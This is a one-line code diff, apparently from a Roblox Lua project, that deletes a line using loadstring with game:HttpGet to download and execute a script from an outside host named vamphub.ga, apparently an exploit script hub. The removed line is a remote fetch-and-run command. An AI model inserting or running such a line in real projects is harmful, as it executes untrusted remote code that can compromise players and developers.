@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://vamphub.ga/api/script"))()
